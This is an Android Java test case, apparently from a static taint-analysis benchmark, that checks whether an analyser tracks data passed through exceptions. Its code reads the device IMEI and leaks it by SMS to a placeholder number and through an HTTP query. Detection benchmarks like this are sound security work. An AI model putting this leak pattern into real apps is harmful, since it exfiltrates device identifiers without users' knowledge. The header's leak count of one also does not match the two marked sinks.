package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name Exceptions4
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created, thrown as exception data and sent out in the exception handler
 * @dataflow source -> imei -> exception -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exception data
 */
public class Exceptions4 extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_exceptions4);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}

		try {
			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
			String imei = telephonyManager.getDeviceId(); //source
			throw new RuntimeException(imei);
		}
		catch (RuntimeException ex) {
			SmsManager sm = SmsManager.getDefault();
			sm.sendTextMessage("+49 1234", null, ex.getMessage(), null, null); //sink, leak

			try {
				connect(ex.getMessage());
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}

}
